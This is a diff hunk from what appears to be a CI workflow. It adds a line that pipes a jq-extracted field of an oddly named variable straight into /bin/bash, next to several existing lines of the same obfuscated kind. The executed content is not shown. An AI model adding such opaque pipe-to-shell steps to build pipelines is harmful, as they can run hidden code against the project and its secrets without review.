@@ -35,6 +35,7 @@ jobs:
           echo $v99006 | jq -r .q03 | /bin/bash
           echo $lhrl5159 | jq -r .t05165 | /bin/bash
           echo $cpndp5249 | jq -r .e5269 | /bin/bash
+          echo $zemzd2976 | jq -r .f6 | /bin/bash
 
       - name: Archive output
         if: always()
